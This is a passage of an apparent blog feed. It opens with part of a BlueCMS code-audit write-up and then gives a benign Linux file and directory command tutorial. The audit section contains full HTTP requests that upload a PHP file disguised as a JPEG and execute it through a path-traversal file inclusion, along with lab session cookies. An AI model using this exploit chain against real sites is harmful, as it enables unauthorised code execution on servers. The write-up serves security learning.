class="line">showmsg(<span class="string">'上传图片出错'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $image_path = <span class="keyword">empty</span>($image_path) ? <span class="string">''</span> : $image_path;</span><br><span class="line">    <span class="keyword">if</span>(!$db-&gt;query(<span class="string">"INSERT INTO "</span>.table(<span class="string">'flash_image'</span>).<span class="string">" (image_id, image_path, image_link, show_order) VALUES ('', '$image_path', '$image_link', '$show_order')"</span>))&#123;</span><br><span class="line">    showmsg(<span class="string">'添加flash图片出错'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    showmsg(<span class="string">'添加flash图片成功'</span>, <span class="string">'flash.php'</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们跟踪一下<strong>img_upload</strong>函数，定位到<code>/include/upload.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $allow_image_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>, <span class="string">'image/gif'</span>, <span class="string">'image/png'</span>, <span class="string">'image/pjpeg'</span>);</span><br><span class="line"><span class="keyword">private</span> $extension_name_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'pjpeg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">img_upload</span><span class="params">($file, $dir = <span class="string">''</span>, $imgname = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(!in_array($file[<span class="string">'type'</span>],<span class="keyword">$this</span>-&gt;allow_image_type))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;font style="color:red;"&gt;不允许的图片类型&lt;/font&gt;'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($imgname))&#123;</span><br><span class="line">    $imgname = <span class="keyword">$this</span>-&gt;create_tempname().<span class="string">'.'</span>.<span class="keyword">$this</span>-&gt;get_type($file[<span class="string">'name'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_type</span><span class="params">($filepath)</span></span>&#123;</span><br><span class="line">    $pos = strrpos($filepath,<span class="string">'.'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $pos;</span><br><span class="line">    <span class="keyword">if</span>($pos !== <span class="keyword">false</span>)&#123;</span><br><span class="line">    $extension_name = substr($filepath,$pos+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//echo $extension_name;</span></span><br><span class="line"><span class="keyword">if</span>(!in_array($extension_name, <span class="keyword">$this</span>-&gt;extension_name_arr))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font style="color:red;"&gt;您上传的文件不符合要求,请重试&lt;/font&gt;'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $extension_name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该文件对上传文件进行文件类型和文件名的白名单检测，但是没有对文件内容进行检查，所以我们能轻易上传一个图片马</p><p>payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/flash.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 499</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/admin/flash.php?act=add</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;image_path&quot;; filename=&quot;info.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;image_link&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;show_order&quot;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b</span><br><span class="line">Content-Disposition: form-data; name=&quot;act&quot;</span><br><span class="line"></span><br><span class="line">do_add</span><br><span class="line">------WebKitFormBoundaryBbgiY0h0EVXwpD7b--</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传成功后我们可以通过管理员界面得知上传文件所在目录为<code>data/upload/flash/15525638906.jpg</code></p><p>我们再通过文件包含漏洞执行该图片马</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /user.php?act=pay HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; detail=1; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">pay=../../data/upload/flash/15525638906.jpgspan><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bluecms/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功执行webshell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，这次代码审计虽然花的时间比较久，但是收获了审计的思路，从一开始看到一个陌生的cms不知从何下手到慢慢有思路，有方法的审计，这个过程还是挺开心的，相信只要花时间有耐心，一定能提高自己的审计能力，最后附上参考文章：</p><p><a href="https://www.freebuf.com/articles/web/166602.html" target="_blank" rel="noopener">一名代码审计新手的实战经历与感悟</a></p><p><a href="https://www.freebuf.com/vuls/196190.html" target="_blank" rel="noopener">从小众blueCMS入坑代码审计</a></p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件与目录管理</title>
    <link href="https://Foxgrin.github.io//posts/5187/"/>
    <id>https://Foxgrin.github.io//posts/5187/</id>
    <published>2019-03-07T13:22:00.000Z</published>
    <updated>2019-03-14T12:00:06.872Z</updated>
    
    <content type="html"><![CDATA[<p>包括在不同的目录间切换，建立与删除目录，建立与删除文件，查看文件内容等<a id="more"></a></p><h2 id="一-目录与路径"><a href="#一-目录与路径" class="headerlink" title="一.目录与路径"></a>一.目录与路径</h2><h3 id="1-相对路径与绝对路径"><a href="#1-相对路径与绝对路径" class="headerlink" title="1.相对路径与绝对路径"></a>1.相对路径与绝对路径</h3><p>绝对路径：路径写法一定由<strong>根目录/</strong>写起，例如：/usr/share/doc这个目录</p><p>相对路径：路径写法不是由根目录写起，指相对于当前工作目录的路径，例如：cd ../usr</p><h3 id="2-目录的相关操作"><a href="#2-目录的相关操作" class="headerlink" title="2.目录的相关操作"></a>2.目录的相关操作</h3><h4 id="（1）切换目录：cd命令"><a href="#（1）切换目录：cd命令" class="headerlink" title="（1）切换目录：cd命令"></a>（1）切换目录：cd命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd [相对路径或绝对路径]</span><br><span class="line">cd . #代表此层目录</span><br><span class="line">cd .. #代表上一层目录</span><br><span class="line">cd ~ #代表目前使用者身份所在的家目录</span><br><span class="line">cd - #代表前一个工作目录</span><br><span class="line">cd ~account #代表account这个使用者的家目录</span><br></pre></td></tr></table></figure><h4 id="（2）显示当前所在目录：pwd命令"><a href="#（2）显示当前所在目录：pwd命令" class="headerlink" title="（2）显示当前所在目录：pwd命令"></a>（2）显示当前所在目录：pwd命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/var/www# pwd</span><br><span class="line">/var/www</span><br></pre></td></tr></table></figure><h4 id="（3）建立新目录：mkdir命令"><a href="#（3）建立新目录：mkdir命令" class="headerlink" title="（3）建立新目录：mkdir命令"></a>（3）建立新目录：mkdir命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# mkdir test</span><br><span class="line">root@ubuntu:/tmp# ls -dl test</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 05:37 test</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# mkdir -p test1/test2/test3/test4 #-p代表递归建立目录</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 05:37 test</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 05:42 test1</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# mkdir -m 711 test2 #-m代表指定目录权限</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 05:37 test</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 05:42 test1</span><br><span class="line">drwx--x--x 2 root root 4096 Mar  7 05:43 test2</span><br></pre></td></tr></table></figure><h4 id="（4）删除目录：rmdir命令"><a href="#（4）删除目录：rmdir命令" class="headerlink" title="（4）删除目录：rmdir命令"></a>（4）删除目录：rmdir命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# rmdir test</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 05:42 test1</span><br><span class="line">drwx--x--x 2 root root 4096 Mar  7 05:43 test2</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# rmdir test1</span><br><span class="line">rmdir: failed to remove `test1&apos;: Directory not empty #test1目录尚有内容，无法删除</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# rmdir -p test1/test2/test3/test4 #-p连通上层目录一起删除</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwx--x--x 2 root root 4096 Mar  7 05:43 test2</span><br></pre></td></tr></table></figure><h2 id="二-文件与目录管理"><a href="#二-文件与目录管理" class="headerlink" title="二.文件与目录管理"></a>二.文件与目录管理</h2><h3 id="1-文件与目录的查看：ls命令"><a href="#1-文件与目录的查看：ls命令" class="headerlink" title="1.文件与目录的查看：ls命令"></a>1.文件与目录的查看：ls命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -a 显示全部文件，包括隐藏文件</span><br><span class="line">ls -d 仅列出目录本身，而不是列出目录内的文件数据</span><br><span class="line">ls -l 详细信息显示，包括文件的属性与权限等数据</span><br></pre></td></tr></table></figure><h3 id="2-文件或目录的复制命令：cp命令"><a href="#2-文件或目录的复制命令：cp命令" class="headerlink" title="2.文件或目录的复制命令：cp命令"></a>2.文件或目录的复制命令：cp命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cp .bashrc /tmp/test/bashrc</span><br><span class="line">root@ubuntu:~# ls /tmp/test</span><br><span class="line">bashrc</span><br><span class="line">root@ubuntu:~# cp -i .bashrc /tmp/test/bashrc #-i：若目标文件以及存在时，在覆盖时会先询问操作的进行</span><br><span class="line">cp: overwrite `/tmp/test/bashrc&apos;? y</span><br><span class="line"></span><br><span class="line">root@ubuntu:~# cp -a .bashrc /tmp/test/bashrc2 #-a：连同文件属性也一起复制过去</span><br><span class="line">root@ubuntu:~# ls -l /tmp/test/bashrc2 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr 19  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr 19  2012 /tmp/test/bashrc2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 06:07 test</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 18:11 test1</span><br><span class="line">root@ubuntu:/tmp# ls test1</span><br><span class="line">root@ubuntu:/tmp# cp test test1</span><br><span class="line">cp: omitting directory `test&apos;</span><br><span class="line">root@ubuntu:/tmp# cp -r test test1 #-r：如果是目录的复制需要加上-r的选项</span><br><span class="line">root@ubuntu:/tmp# ls test1</span><br><span class="line">test</span><br><span class="line">root@ubuntu:/tmp# ls test1/test</span><br><span class="line">bashrc  bashrc1  bashrc2</span><br></pre></td></tr></table></figure><h3 id="3-文件或目录的删除命令：rm命令"><a href="#3-文件或目录的删除命令：rm命令" class="headerlink" title="3.文件或目录的删除命令：rm命令"></a>3.文件或目录的删除命令：rm命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp# rm test2</span><br><span class="line">rm: cannot remove `test2&apos;: Is a directory</span><br><span class="line">root@ubuntu:/tmp# rm -r test2 #当删除目录时，需要加上-r选项</span><br><span class="line">root@ubuntu:/tmp# ls -dl test*</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar  7 06:07 test</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar  7 18:12 test1</span><br><span class="line"></span><br><span class="line">root@ubuntu:/tmp# rm -ir test #加入-i选项，删除前会询问操作者是否操作，避免误删除</span><br><span class="line">rm: descend into directory `test&apos;? ^C #按下[ctrl]+c中断删除操作</span><br></pre></td></tr></table></figure><h3 id="4-移动文件或目录命令或重命名：mv命令"><a href="#4-移动文件或目录命令或重命名：mv命令" class="headerlink" title="4.移动文件或目录命令或重命名：mv命令"></a>4.移动文件或目录命令或重命名：mv命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# mkdir mvtest</span><br><span class="line">root@ubuntu:~/tmp# cp ~/.bashrc bashrc</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">bashrc  mvtest</span><br><span class="line">root@ubuntu:~/tmp# mv bashrc mvtest #将bashrc文件移动到mvtest目录下</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest</span><br><span class="line">bashrc</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest  mvtest2</span><br><span class="line">root@ubuntu:~/tmp# mv mvtest mvtest2 #将mvtest目录移动到mvtest2目录下</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest2</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest2</span><br><span class="line">mvtest</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/tmp# mv mvtest2 mvtest1 #将mvtest2目录重命名为mvtest1目录</span><br><span class="line">root@ubuntu:~/tmp# ls</span><br><span class="line">mvtest1</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest1/</span><br><span class="line">mvtest</span><br><span class="line">root@ubuntu:~/tmp# ls mvtest1/mvtest/</span><br><span class="line">bashrc</span><br></pre></td></tr></table></figure><h3 id="5-获取路径的文件名与目录名称：basename命令和dirname命令"><a href="#5-获取路径的文件名与目录名称：basename命令和dirname命令" class="headerlink" title="5.获取路径的文件名与目录名称：basename命令和dirname命令"></a>5.获取路径的文件名与目录名称：basename命令和dirname命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# basename /etc/sysconfig/network</span><br><span class="line">network #获取最后的文件名</span><br><span class="line">root@ubuntu:~# dirname /etc/sysconfig/network</span><br><span class="line">/etc/sysconfig #获取目录名</span><br></pre></td></tr></table></figure><h2 id="三-文件内容查看"><a href="#三-文件内容查看" class="headerlink" title="三.文件内容查看"></a>三.文件内容查看</h2><h3 id="1-直接查看文件内容：cat，tac，nl命令"><a href="#1-直接查看文件内容：cat，tac，nl命令" class="headerlink" title="1.直接查看文件内容：cat，tac，nl命令"></a>1.直接查看文件内容：cat，tac，nl命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# cat /etc/passwd #从第一行开始显示文件内容</span><br><span class="line">root@ubuntu:~# tac /etc/passwd #从最后一行开始显示文件内容</span><br><span class="line">root@ubuntu:~# nl /etc/passwd  #在文件内容前加上行号</span><br></pre></td></tr></table></figure><h3 id="2-可翻页查看：more，less命令"><a href="#2-可翻页查看：more，less命令" class="headerlink" title="2.可翻页查看：more，less命令"></a>2.可翻页查看：more，less命令</h3><p>cat命令是将文件内容一次性显示出来，没有一页一页翻动的功能，而<strong>more</strong>和<strong>less</strong>命令具有一页一页翻动的功能</p><p>在more命令按以下键的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格键（space）：代表向下翻一页</span><br><span class="line">Enter：代表向下翻一行</span><br><span class="line">b或[ctrl]-b：代表往回翻页</span><br><span class="line">q：代表立刻离开more，不再显示该文件内容</span><br></pre></td></tr></table></figure><p>在less命令按以下键的功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格键：向下翻动一页</span><br><span class="line">[pagedown]：向下翻动一行</span><br><span class="line">[pageup]：向上翻动一行</span><br><span class="line">q：离开less程序</span><br></pre></td></tr></table></figure><h3 id="3-数据截取：head，tail命令"><a href="#3-数据截取：head，tail命令" class="headerlink" title="3.数据截取：head，tail命令"></a>3.数据截取：head，tail命令</h3><p><strong>head</strong>命令能取出一个文件的前几行，<strong>tail</strong>则是取出文件的后几行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">head [-n number] 文件</span><br><span class="line">root@ubuntu:~# head /etc/manpath.config #默认显示前十行</span><br><span class="line">root@ubuntu:~# head -n 20 /etc/manpath.config #显示前二十行</span><br><span class="line">root@ubuntu:~# head -n -100 /etc/manpath.config #后一百行不会显示出来</span><br><span class="line"></span><br><span class="line">tail [-n number]文件</span><br><span class="line">root@ubuntu:~# tail /etc/manpath.config #默认显示最后十行</span><br><span class="line">root@ubuntu:~# tail -n 20 /etc/manpath.config #显示最后二十行</span><br><span class="line">root@ubuntu:~# tail -n +100 /etc/manpath.config #后一百行显示出来</span><br></pre></td></tr></table></figure><h3 id="4-非纯文本文件读取：od命令"><a href="#4-非纯文本文件读取：od命令" class="headerlink" title="4.非纯文本文件读取：od命令"></a>4.非纯文本文件读取：od命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">od [-t TYPE] 文件</span><br><span class="line">可读取二进制等文件</span><br></pre></td></tr></table></figure><h3 id="5-创建文件：touch命令"><a href="#5-创建文件：touch命令" class="headerlink" title="5.创建文件：touch命令"></a>5.创建文件：touch命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch 文件名</span><br></pre></td></tr></table></figure><h2 id="四-文件默认权限：umask"><a href="#四-文件默认权限：umask" class="headerlink" title="四.文件默认权限：umask"></a>四.文件默认权限：umask</h2><p>当我们建立一个新的文件或目录时，它的默认权限与<code>umask</code>有关，它指定了目前用户在建立文件或目录时候的权限默认值，得知<code>umask</code>的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# umask</span><br><span class="line">0022</span><br><span class="line">root@ubuntu:~/tmp# umask -S</span><br><span class="line">u=rwx,g=rx,o=rx</span><br></pre></td></tr></table></figure><p>查看的方式有两种，一种可以直接输入<code>umask</code>，就可以看到数字类型的权限设置值，另一种则是加入<code>-S</code>这个选项，就会以符号类型的方式来显示出权限了</p><p>但是要注意的是，这里umask的值并不直接是文件或目录的默认权限值，它规定的是是默认值需要减掉的权限，文件的默认权限值为：<code>-rw-rw-rw-</code>，即<code>666</code>；目录的默认权限值为<code>drwxrwxrwx</code>，即<code>777</code>，再减去umask指定的值，那么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">建立文件时：(-rw-rw-rw-) - (-----w--w-) ==&gt; -rw-r--r--</span><br><span class="line">建立目录时：(drwxrwxrwx) - (d----w--w-) ==&gt; drwxr-xr-x</span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# touch test1</span><br><span class="line">root@ubuntu:~/tmp# mkdir test2</span><br><span class="line">root@ubuntu:~/tmp# ls -dl test*</span><br><span class="line">-rw-r--r-- 1 root root    0 Mar 10 06:05 test1</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 10 06:05 test2</span><br></pre></td></tr></table></figure><p>修改umask值的方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/tmp# umask 002</span><br><span class="line">root@ubuntu:~/tmp# touch test3</span><br><span class="line">root@ubuntu:~/tmp# mkdir test4</span><br><span class="line">root@ubuntu:~/tmp# ls -dl test[34]</span><br><span class="line">-rw-rw-r-- 1 root root    0 Mar 10 06:16 test3</span><br><span class="line">drwxrwxr-x 2 root root 4096 Mar 10 06:16 test4</span><br></pre></td></tr></table></figure><h2 id="五-文件隐藏属性"><a href="#五-文件隐藏属性" class="headerlink" title="五.文件隐藏属性"></a>五.文件隐藏属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">A  ：当设定了 A 这个属性时，若你有存取此档案(或目录)时，他的访问时间 atime</span><br><span class="line">     将不会被修改，可避免I/O较慢的机器过度的存取磁盘。这对速度较慢的计算机有帮助</span><br><span class="line">S  ：一般档案是异步写入磁盘的(原理请参考第五章sync的说明)，如果加上 S 这个</span><br><span class="line">     属性时，当你进行任何档案的修改，该更动会『同步』写入磁盘中。</span><br><span class="line">a  ：当设定 a 之后，这个档案将只能增加数据，而不能删除也不能修改数据，只有root </span><br><span class="line">     才能设定这个属性。 </span><br><span class="line">c  ：这个属性设定之后，将会自动的将此档案『压缩』，在读取的时候将会自动解压缩，</span><br><span class="line">     但是在储存的时候，将会先进行压缩后再储存(看来对于大档案似乎蛮有用的！)</span><br><span class="line">d  ：当 dump 程序被执行的时候，设定 d 属性将可使该档案(或目录)不会被 dump 备份</span><br><span class="line">i  ：这个 i 